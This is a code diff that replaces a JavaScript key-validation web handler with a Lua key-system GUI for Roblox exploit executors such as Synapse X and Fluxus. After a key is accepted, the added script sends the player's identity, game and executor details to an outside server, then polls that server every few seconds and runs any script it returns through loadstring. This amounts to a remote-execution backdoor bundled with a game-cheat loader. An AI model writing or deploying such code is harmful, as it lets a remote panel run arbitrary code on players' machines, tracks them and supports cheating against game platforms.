@@ -1,416 +1,378 @@
--- YouSuck Key System & Script Delivery
--- Secure key validation and IP-based access control
-
-const ALLOWED_IPS = process.env.ALLOWED_IPS?.split(",") || ["127.0.0.1", "localhost"];
-const VALID_KEYS = {
-  "ys_key_a1b2c3d4e5f6": { owner: "PlayerOne", roblox_id: "123456789", created: "2026-06-20", status: "active" },
-  "ys_key_f6e5d4c3b2a1": { owner: "RoUser42", roblox_id: "987654321", created: "2026-06-19", status: "active" },
-  "ys_key_9z8y7x6w5v4u": { owner: "xXDevXx", roblox_id: "555666777", created: "2026-06-18", status: "active" },
-  "ys_key_demo_test": { owner: "DemoUser", roblox_id: "111222333", created: "2026-06-21", status: "demo" },
-};
-
-const ROBLOX_SCRIPT = `
--- YouSuck Roblox Executor Script v1.0
--- Secure key-based execution system
-
-local KEY = "{KEY}"
-local API_URL = "{API_URL}"
-local HEARTBEAT_INTERVAL = 10 -- seconds
-
--- Validate key format
-if not KEY or KEY:len() < 10 then
-  error("Invalid key provided")
-end
-
--- Get player info
+--[[ YouSuck — Final Clean Key System ]] 
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
--- Get current game info
-local PlaceId = game.PlaceId
-local GameName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name or "Unknown Game"
+local Player = Players.LocalPlayer
 
--- Initialize heartbeat tracking
-local LastHeartbeat = tick()
-
--- Send heartbeat to server
-local function SendHeartbeat()
-  local success, result = pcall(function()
-    local HttpService = game:GetService("HttpService")
-    local data = {
-      key = KEY,
-      roblox_id = LocalPlayer.UserId,
-      roblox_name = LocalPlayer.Name,
-      game_id = PlaceId,
-      game_name = GameName,
-      timestamp = os.time(),
-      character_position = Character and Character:FindFirstChild("HumanoidRootPart") and Character.HumanoidRootPart.Position or Vector3.new(0, 0, 0),
-    }
-    
-    local response = HttpService:PostAsync(
-      API_URL .. "/api/heartbeat",
-      HttpService:JSONEncode(data),
-      Enum.HttpContentType.ApplicationJson
-    )
-    
-    return response
-  end)
-  
-  if not success then
-    warn("[YouSuck] Heartbeat failed: " .. tostring(result))
-  end
-  
-  LastHeartbeat = tick()
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+if not request then 
+    request = function(o) return HttpService:RequestAsync(o) end 
 end
 
--- Send initial heartbeat
-SendHeartbeat()
+local API_URL = "https://yoursuck.vercel.app/api/verify-key"
+local HEARTBEAT_URL = "https://yoursuck.vercel.app/api/clients"
+local COMMANDS_URL = "https://yoursuck.vercel.app/api/clients?commands=1&robloxId="
 
--- Setup periodic heartbeat
-local HeartbeatConnection
-HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
-  if tick() - LastHeartbeat >= HEARTBEAT_INTERVAL then
-    SendHeartbeat()
-  end
-end)
+local HEARTBEAT_INTERVAL = 15
 
--- Cleanup on player leave
-Players.PlayerRemoving:Connect(function(player)
-  if player == LocalPlayer then
-    if HeartbeatConnection then
-      HeartbeatConnection:Disconnect()
-    end
-  end
-end)
-
-print("[YouSuck] Executor initialized with key: " .. KEY:sub(1, 8) .. "...")
-print("[YouSuck] Game: " .. GameName .. " (ID: " .. PlaceId .. ")")
-print("[YouSuck] Player: " .. LocalPlayer.Name .. " (ID: " .. LocalPlayer.UserId .. ")")
-`;
-
-const KEY_VALIDATION_HTML = (key, keyData) => \`<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>YouSuck - Key Validation</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap');
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      min-height: 100vh;
-      background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
-      font-family: 'Space Grotesk', monospace;
-      color: #ffffff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    .container {
-      max-width: 600px;
-      background: rgba(15, 15, 25, 0.8);
-      border: 1px solid rgba(34, 211, 238, 0.3);
-      border-radius: 12px;
-      padding: 40px;
-      backdrop-filter: blur(10px);
-      box-shadow: 0 8px 32px rgba(34, 211, 238, 0.1);
-    }
-    .header {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 30px;
-    }
-    .logo {
-      width: 40px;
-      height: 40px;
-      background: linear-gradient(135deg, #00abff, #0088cc);
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-      font-size: 20px;
-    }
-    h1 {
-      font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 10px;
-    }
-    .status {
-      display: inline-block;
-      padding: 6px 12px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: 600;
-      letter-spacing: 1px;
-      margin-bottom: 20px;
-    }
-    .status.active {
-      background: rgba(34, 197, 94, 0.2);
-      color: #22c55e;
-      border: 1px solid rgba(34, 197, 94, 0.5);
-    }
-    .status.demo {
-      background: rgba(168, 85, 247, 0.2);
-      color: #a855f7;
-      border: 1px solid rgba(168, 85, 247, 0.5);
-    }
-    .info-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 20px;
-      margin-bottom: 30px;
-    }
-    .info-item {
-      background: rgba(34, 211, 238, 0.05);
-      border: 1px solid rgba(34, 211, 238, 0.2);
-      border-radius: 8px;
-      padding: 15px;
-    }
-    .info-label {
-      font-size: 12px;
-      color: #a1a1aa;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      margin-bottom: 8px;
-    }
-    .info-value {
-      font-size: 14px;
-      color: #00abff;
-      font-weight: 600;
-      word-break: break-all;
-    }
-    .script-section {
-      background: rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(34, 211, 238, 0.2);
-      border-radius: 8px;
-      padding: 20px;
-      margin-bottom: 20px;
-    }
-    .script-title {
-      font-size: 12px;
-      color: #a1a1aa;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      margin-bottom: 12px;
-    }
-    .script-code {
-      background: rgba(0, 0, 0, 0.5);
-      border: 1px solid rgba(34, 211, 238, 0.1);
-      border-radius: 6px;
-      padding: 12px;
-      font-size: 11px;
-      color: #00ff00;
-      font-family: 'Courier New', monospace;
-      overflow-x: auto;
-      max-height: 200px;
-      overflow-y: auto;
-      line-height: 1.4;
-    }
-    .button-group {
-      display: flex;
-      gap: 12px;
-      margin-top: 20px;
-    }
-    .btn {
-      flex: 1;
-      padding: 12px 20px;
-      border: none;
-      border-radius: 6px;
-      font-weight: 600;
-      font-size: 14px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      text-decoration: none;
-      display: inline-block;
-      text-align: center;
-    }
-    .btn-primary {
-      background: linear-gradient(135deg, #00abff, #0088cc);
-      color: white;
-    }
-    .btn-primary:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 16px rgba(34, 211, 238, 0.3);
-    }
-    .btn-secondary {
-      background: rgba(34, 211, 238, 0.1);
-      color: #00abff;
-      border: 1px solid rgba(34, 211, 238, 0.3);
-    }
-    .btn-secondary:hover {
-      background: rgba(34, 211, 238, 0.2);
-    }
-    .footer {
-      text-align: center;
-      margin-top: 20px;
-      font-size: 12px;
-      color: #a1a1aa;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="header">
-      <div class="logo">YS</div>
-      <h1>YouSuck</h1>
-    </div>
-    
-    <div class="status \${keyData.status}">\${keyData.status.toUpperCase()}</div>
-    
-    <div class="info-grid">
-      <div class="info-item">
-        <div class="info-label">Owner</div>
-        <div class="info-value">\${keyData.owner}</div>
-      </div>
-      <div class="info-item">
-        <div class="info-label">Roblox ID</div>
-        <div class="info-value">\${keyData.roblox_id}</div>
-      </div>
-      <div class="info-item">
-        <div class="info-label">Created</div>
-        <div class="info-value">\${keyData.created}</div>
-      </div>
-      <div class="info-item">
-        <div class="info-label">Key Status</div>
-        <div class="info-value">\${keyData.status === 'active' ? '✓ Active' : '◉ Demo'}</div>
-      </div>
-    </div>
-    
-    <div class="script-section">
-      <div class="script-title">Roblox Executor Script</div>
-      <div class="script-code" id="script-code"></div>
-    </div>
-    
-    <div class="button-group">
-      <button class="btn btn-primary" onclick="copyScript()">Copy Script</button>
-      <button class="btn btn-secondary" onclick="downloadScript()">Download</button>
-    </div>
-    
-    <div class="footer">
-      <p>Key: \${key.substring(0, 12)}...</p>
-      <p>Status: Valid & Active</p>
-    </div>
-  </div>
-  
-  <script>
-    const scriptCode = \`${ROBLOX_SCRIPT.replace(/`/g, '\\`').replace(/"/g, '\\"')}\`;
-    document.getElementById('script-code').textContent = scriptCode;
-    
-    function copyScript() {
-      navigator.clipboard.writeText(scriptCode).then(() => {
-        alert('Script copied to clipboard!');
-      });
-    }
-    
-    function downloadScript() {
-      const element = document.createElement('a');
-      element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(scriptCode));
-      element.setAttribute('download', 'yousuck_executor.lua');
-      element.style.display = 'none';
-      document.body.appendChild(element);
-      element.click();
-      document.body.removeChild(element);
-    }
-  </script>
-</body>
-</html>
-\`;
-
-const INVALID_KEY_HTML = \`<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>YouSuck - Invalid Key</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap');
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      min-height: 100vh;
-      background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
-      font-family: 'Space Grotesk', monospace;
-      color: #ffffff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    .container {
-      max-width: 500px;
-      background: rgba(15, 15, 25, 0.8);
-      border: 1px solid rgba(239, 68, 68, 0.3);
-      border-radius: 12px;
-      padding: 40px;
-      backdrop-filter: blur(10px);
-      text-align: center;
-    }
-    .icon {
-      font-size: 48px;
-      margin-bottom: 20px;
-    }
-    h1 {
-      font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 10px;
-      color: #ef4444;
-    }
-    p {
-      color: #a1a1aa;
-      margin-bottom: 30px;
-      line-height: 1.6;
-    }
-    .btn {
-      display: inline-block;
-      padding: 12px 30px;
-      background: linear-gradient(135deg, #00abff, #0088cc);
-      color: white;
-      text-decoration: none;
-      border-radius: 6px;
-      font-weight: 600;
-      transition: all 0.3s ease;
-    }
-    .btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 16px rgba(34, 211, 238, 0.3);
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="icon">✗</div>
-    <h1>Invalid Key</h1>
-    <p>The key you provided is not valid or has expired. Please check your key and try again.</p>
-    <a href="/" class="btn">Return Home</a>
-  </div>
-</body>
-</html>
-\`;
-
-export default function handler(req, res) {
-  const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-  const { key } = req.query;
-
-  // IP validation
-  const isAllowedIP = ALLOWED_IPS.includes(clientIP) || ALLOWED_IPS.includes("*");
-  
-  // Key validation
-  const keyData = VALID_KEYS[key];
-  const isValidKey = !!keyData;
-
-  if (!isAllowedIP) {
-    return res.status(403).send(KEY_VALIDATION_HTML(key || "unknown", { owner: "Unknown", roblox_id: "N/A", created: "N/A", status: "invalid" }));
-  }
-
-  if (!isValidKey) {
-    return res.status(400).send(INVALID_KEY_HTML);
-  }
-
-  // Return validated script with key injected
-  const script = ROBLOX_SCRIPT.replace("{KEY}", key).replace("{API_URL}", process.env.API_URL || "http://localhost:3000");
-  
-  res.status(200).send(KEY_VALIDATION_HTML(key, keyData));
+-- PALETTE
+local C = {
+    BG = Color3.fromRGB(10, 10, 10),
+    Surface = Color3.fromRGB(15, 15, 15),
+    Raised = Color3.fromRGB(22, 22, 22),
+    Border = Color3.fromRGB(38, 38, 38),
+    Primary = Color3.fromRGB(1, 168, 225),
+    PrimaryLo = Color3.fromRGB(1, 134, 181),
+    Text = Color3.fromRGB(240, 240, 240),
+    TextMid = Color3.fromRGB(150, 150, 150),
+    TextLow = Color3.fromRGB(75, 75, 75),
+    Success = Color3.fromRGB(34, 197, 94),
+    Error = Color3.fromRGB(239, 68, 68),
+    White = Color3.new(1, 1, 1),
 }
+
+local function tw(obj, goal, t, style, dir)
+    TweenService:Create(obj, TweenInfo.new(t or 0.18, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out), goal):Play()
+end
+
+local function corner(p, r)
+    local c = Instance.new("UICorner", p)
+    c.CornerRadius = UDim.new(0, r or 6)
+    return c
+end
+
+local function stroke(p, col, thick)
+    local s = Instance.new("UIStroke", p)
+    s.Color = col or C.Border
+    s.Thickness = thick or 1
+    return s
+end
+
+local function pad(p, l, r, t, b)
+    local u = Instance.new("UIPadding", p)
+    u.PaddingLeft = UDim.new(0, l or 0)
+    u.PaddingRight = UDim.new(0, r or 0)
+    u.PaddingTop = UDim.new(0, t or 0)
+    u.PaddingBottom = UDim.new(0, b or 0)
+end
+
+local function lbl(parent, props)
+    local l = Instance.new("TextLabel", parent)
+    l.BackgroundTransparency = 1
+    l.BorderSizePixel = 0
+    l.RichText = true
+    for k, v in pairs(props) do l[k] = v end
+    return l
+end
+
+local function frm(parent, props)
+    local f = Instance.new("Frame", parent)
+    f.BorderSizePixel = 0
+    for k, v in pairs(props) do f[k] = v end
+    return f
+end
+
+local function makeDraggable(root, handle)
+    handle = handle or root
+    local drag, dstart, opos
+    handle.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            drag = true; dstart = i.Position; opos = root.Position
+            i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then drag = false end end)
+        end
+    end)
+    handle.InputChanged:Connect(function(i)
+        if drag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            local d = i.Position - dstart
+            root.Position = UDim2.new(opos.X.Scale, opos.X.Offset + d.X, opos.Y.Scale, opos.Y.Offset + d.Y)
+        end
+    end)
+end
+
+-- GUI
+local Gui = Instance.new("ScreenGui")
+Gui.Name = "KeySystem"
+Gui.ResetOnSpawn = false
+Gui.IgnoreGuiInset = true
+Gui.DisplayOrder = 999
+Gui.Parent = Player:WaitForChild("PlayerGui")
+
+local Scrim = frm(Gui, { Size = UDim2.new(1,0,1,0), BackgroundColor3 = Color3.new(0,0,0), BackgroundTransparency = 1, ZIndex = 1 })
+tw(Scrim, {BackgroundTransparency = 0.6}, 0.4)
+
+local W, H = 400, 290
+local Card = frm(Gui, { Size = UDim2.new(0, W, 0, H), Position = UDim2.new(0.5, -W/2, 0.5, -H/2 + 24), BackgroundColor3 = C.Surface, BackgroundTransparency = 1, ZIndex = 2 })
+corner(Card, 10)
+stroke(Card, C.Border, 1)
+tw(Card, {BackgroundTransparency = 0, Position = UDim2.new(0.5,-W/2,0.5,-H/2)}, 0.4, Enum.EasingStyle.Quart)
+
+local TBar = frm(Card, { Size = UDim2.new(1, 0, 0, 40), BackgroundColor3 = Color3.fromRGB(14, 14, 14), ZIndex = 3 })
+corner(TBar, 10)
+makeDraggable(Card, TBar)
+
+lbl(TBar, { Size = UDim2.new(0, 120, 1, 0), Position = UDim2.new(0, 12, 0, 0), Text = " ", TextColor3 = C.Text, TextSize = 20, Font = Enum.Font.Gotham, TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 4 })
+
+local CloseBtn = Instance.new("TextButton", TBar)
+CloseBtn.Size = UDim2.new(0, 28, 1, 0)
+CloseBtn.Position = UDim2.new(1, -30, 0, 0)
+CloseBtn.BackgroundTransparency = 1
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+CloseBtn.Font = Enum.Font.Gotham
+CloseBtn.TextSize = 13
+CloseBtn.ZIndex = 5
+CloseBtn.MouseButton1Click:Connect(function()
+    tw(Card, {BackgroundTransparency=1, Position=UDim2.new(0.5,-W/2,0.5,-H/2+18)}, 0.25)
+    tw(Scrim, {BackgroundTransparency=1}, 0.25)
+    task.delay(0.3, function() Gui:Destroy() end)
+end)
+
+local Body = frm(Card, { Size = UDim2.new(1, 0, 1, -41), Position = UDim2.new(0, 0, 0, 41), BackgroundTransparency = 1, ZIndex = 3 })
+pad(Body, 22, 22, 0, 0)
+
+local Title = lbl(Body, { Size = UDim2.new(1, 0, 0, 26), Position = UDim2.new(0, 0, 0, 16), TextColor3 = C.Text, TextSize = 28, Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 4 })
+Title.RichText = true
+Title.Text = ' <font color="#FFFFFF">                You</font><font color="#00ABFF">Suck</font>'
+
+local InputWrap = frm(Body, { Size = UDim2.new(1, 0, 0, 42), Position = UDim2.new(0, 0, 0, 70), BackgroundColor3 = C.Raised, ZIndex = 4 })
+corner(InputWrap, 7)
+local InputStroke = stroke(InputWrap, C.Border, 1)
+local Input = Instance.new("TextBox", InputWrap)
+Input.Size = UDim2.new(1, 0, 1, 0)
+Input.BackgroundTransparency = 1
+Input.Text = ""
+Input.PlaceholderText = "Paste Key Here"
+Input.TextColor3 = C.Text
+Input.PlaceholderColor3 = C.TextLow
+Input.Font = Enum.Font.Gotham
+Input.TextSize = 12
+Input.ClearTextOnFocus = false
+Input.ZIndex = 5
+pad(Input, 14, 14, 0, 0)
+
+local StatusRow = frm(Body, { Size = UDim2.new(1, 0, 0, 18), Position = UDim2.new(0, 0, 0, 178), BackgroundTransparency = 1, ZIndex = 4 })
+local SDot = frm(StatusRow, { Size = UDim2.new(0, 6, 0, 6), Position = UDim2.new(0, 0, 0.5, -3), BackgroundColor3 = C.TextLow, ZIndex = 5 })
+corner(SDot, 3)
+local SLbl = lbl(StatusRow, { Size = UDim2.new(1, -12, 1, 0), Position = UDim2.new(0, 12, 0, 0), Text = "Awaiting input", TextColor3 = C.TextLow, TextSize = 11, Font = Enum.Font.Gotham, TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 5 })
+
+local function setStatus(msg, col, dotCol)
+    SLbl.Text = msg
+    SLbl.TextColor3 = col or C.TextLow
+    tw(SDot, {BackgroundColor3 = dotCol or C.TextLow}, 0.15)
+end
+
+local function toast(msg, col, duration)
+    col = col or C.Primary; duration = duration or 3
+    local T = frm(Gui, { Size=UDim2.new(0,260,0,44), Position=UDim2.new(0.5,-130,1,10), BackgroundColor3=C.Surface, ZIndex=20 })
+    corner(T, 8); stroke(T, col, 1)
+    local Acc = frm(T, {Size=UDim2.new(0,3,1,-16), Position=UDim2.new(0,7,0,8), BackgroundColor3=col, ZIndex=21})
+    corner(Acc, 2)
+    lbl(T, {Size=UDim2.new(1,-22,1,0), Position=UDim2.new(0,18,0,0), Text=msg, TextColor3=C.Text, TextSize=12, Font=Enum.Font.GothamBold, TextXAlignment=Enum.TextXAlignment.Left, ZIndex=22})
+    tw(T, {Position=UDim2.new(0.5,-130,1,-54)}, 0.35, Enum.EasingStyle.Back)
+    task.delay(duration, function()
+        tw(T, {Position=UDim2.new(0.5,-130,1,10), BackgroundTransparency=1}, 0.3)
+        task.delay(0.35, function() T:Destroy() end)
+    end)
+end
+
+local BtnRow = frm(Body, { Size = UDim2.new(1, 0, 0, 42), Position = UDim2.new(0, 0, 0, 124), BackgroundTransparency = 1, ZIndex = 4 })
+
+local GetKeyWrap = frm(BtnRow, { Size = UDim2.new(0.48, 0, 1, 0), Position = UDim2.new(0, 0, 0, 0), BackgroundColor3 = C.Primary, ZIndex = 4 })
+corner(GetKeyWrap, 7)
+local GetKeyBtn = Instance.new("TextButton", GetKeyWrap)
+GetKeyBtn.Size = UDim2.new(1, 0, 1, 0)
+GetKeyBtn.BackgroundTransparency = 1
+GetKeyBtn.Text = "Get Key"
+GetKeyBtn.TextColor3 = C.White
+GetKeyBtn.Font = Enum.Font.GothamBold
+GetKeyBtn.TextSize = 13
+GetKeyBtn.ZIndex = 5
+GetKeyBtn.MouseButton1Up:Connect(function()
+    setclipboard("https://yoursuck.vercel.app/")
+    toast("Link copied to clipboard!", C.Primary, 2.5)
+end)
+
+local BtnWrap = frm(BtnRow, { Size = UDim2.new(0.48, 0, 1, 0), Position = UDim2.new(0.52, 0, 0, 0), BackgroundColor3 = C.Primary, ZIndex = 4 })
+corner(BtnWrap, 7)
+local Btn = Instance.new("TextButton", BtnWrap)
+Btn.Size = UDim2.new(1, 0, 1, 0)
+Btn.BackgroundTransparency = 1
+Btn.Text = "Verify Key"
+Btn.TextColor3 = C.White
+Btn.Font = Enum.Font.GothamBold
+Btn.TextSize = 13
+Btn.ZIndex = 5
+
+-- EXECUTOR DETECTION WITH VERSION
+local function getExecutor()
+    if syn then
+        return "Synapse X", (syn.get_version and tostring(syn.get_version()) or "")
+    elseif fluxus then
+        return "Fluxus", ""
+    elseif getgenv and getgenv().KRNL_LOADED then
+        return "Krnl", ""
+    elseif getexecutorname then
+        return getexecutorname(), (getexecutorversion and tostring(getexecutorversion()) or "")
+    else
+        return "Unknown", ""
+    end
+end
+
+-- HEARTBEAT
+local sessionStart = os.time()
+
+local function startHeartbeat(key)
+    local gameName = "Unknown Game"
+    pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
+
+    task.spawn(function()
+        while task.wait(HEARTBEAT_INTERVAL) do
+            pcall(function()
+                local executorName, executorVersion = getExecutor()
+                local payload = {
+                    key = key,
+                    robloxId = tostring(Player.UserId),
+                    robloxName = Player.Name,
+                    gameId = game.PlaceId,
+                    gameName = gameName,
+                    jobId = game.JobId,
+                    timestamp = os.time(),
+                    uptime = os.time() - sessionStart,
+                    executor = executorName,
+                    executorVersion = executorVersion,
+                    ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() or 0),
+                }
+
+                request({
+                    Url = HEARTBEAT_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end)
+        end
+    end)
+end
+
+-- COMMAND POLLING (kick / execute)
+local function startCommandPoll(robloxId)
+    task.spawn(function()
+        while task.wait(3) do
+            pcall(function()
+                local res = request({
+                    Url = COMMANDS_URL .. tostring(robloxId),
+                    Method = "GET",
+                    Headers = {["Content-Type"] = "application/json"},
+                })
+                if res and res.StatusCode == 200 then
+                    local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+                    if ok and data and data.commands then
+                        for _, cmd in ipairs(data.commands) do
+                            if cmd.type == "kick" then
+                                Player:Kick("You have been kicked by the panel.")
+                            elseif cmd.type == "execute" and cmd.script and cmd.script ~= "" then
+                                local fn, err = loadstring(cmd.script)
+                                if fn then
+                                    task.spawn(function() pcall(fn) end)
+                                else
+                                    warn("[YouSuck] Execute error: " .. tostring(err))
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end)
+end
+
+local function isoToTs(s)
+    if not s or type(s) ~= "string" then return os.time() + 86400 end
+    local y,mo,d,h,mi,sc = s:match("(%d+)-(%d+)-(%d+)T(%d+):(%d+):(%d+)")
+    if not y then return os.time() + 86400 end
+    return os.time({year=y,month=mo,day=d,hour=h,min=mi,sec=sc})
+end
+
+local function spawnPill(expiresAt, key)
+    local ts = isoToTs(expiresAt)
+    startHeartbeat(key)
+    startCommandPoll(Player.UserId)
+
+    local Pill = frm(Gui, { Size=UDim2.new(0,220,0,36), Position=UDim2.new(1,-230,1,10), BackgroundColor3=C.Surface, ZIndex=15, Active=true })
+    corner(Pill, 18); stroke(Pill, C.Border, 1); makeDraggable(Pill)
+    local PillDot = frm(Pill, { Size=UDim2.new(0,7,0,7), Position=UDim2.new(0,12,0.5,-3), BackgroundColor3=C.Success, ZIndex=16 })
+    corner(PillDot, 4)
+    local PillLbl = lbl(Pill, { Size=UDim2.new(1,-28,1,0), Position=UDim2.new(0,24,0,0), Text="Session active", TextColor3=C.TextMid, TextSize=11, Font=Enum.Font.GothamBold, TextXAlignment=Enum.TextXAlignment.Left, ZIndex=16 })
+    tw(Pill, {Position=UDim2.new(1,-230,1,-46)}, 0.4, Enum.EasingStyle.Back)
+
+    local conn = RunService.Heartbeat:Connect(function()
+        if not Pill.Parent then conn:Disconnect() return end
+        local left = ts - os.time()
+        if left <= 0 then
+            PillLbl.Text = "Session expired"
+            PillLbl.TextColor3 = C.Error
+            PillDot.BackgroundColor3 = C.Error
+        else
+            local h = math.floor(left/3600)
+            local m = math.floor((left%3600)/60)
+            local s = left%60
+            PillLbl.Text = string.format("%dh %02dm %02ds left", h, m, s)
+        end
+    end)
+end
+
+-- VERIFY
+Btn.MouseButton1Click:Connect(function()
+    local key = Input.Text:gsub("%s+","")
+    if key == "" then
+        setStatus("No key entered.", C.Error, C.Error)
+        return
+    end
+
+    Btn.Text = "Verifying..."
+    Btn.Active = false
+    setStatus("Contacting server...", C.TextMid, C.Primary)
+
+    task.spawn(function()
+        local ok, res = pcall(function()
+            return request({
+                Url = API_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({key = key, robloxId = tostring(Player.UserId)})
+            })
+        end)
+
+        if ok and res and res.StatusCode == 200 then
+            local dok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+            if dok and data.valid then
+                Btn.Text = "Access Granted"
+                setStatus("Authenticated successfully.", C.Success, C.Success)
+                toast("Welcome Back!", C.Success, 3)
+
+                task.wait(0.8)
+                tw(Card, {BackgroundTransparency=1, Position=UDim2.new(0.5,-W/2,0.5,-H/2-16)}, 0.3)
+                tw(Scrim, {BackgroundTransparency=1}, 0.3)
+
+                task.delay(0.35, function()
+                    Card:Destroy()
+                    Scrim:Destroy()
+                    spawnPill(data.expiresAt, key)
+                end)
+            else
+                Btn.Text = "Verify Key"
+                Btn.Active = true
+                setStatus("Invalid key.", C.Error, C.Error)
+            end
+        else
+            Btn.Text = "Verify Key"
+            Btn.Active = true
+            setStatus("Server error.", C.Error, C.Error)
+        end
+    end)
+end)
+
+print("YouSuck Key System Loaded Successfully!")
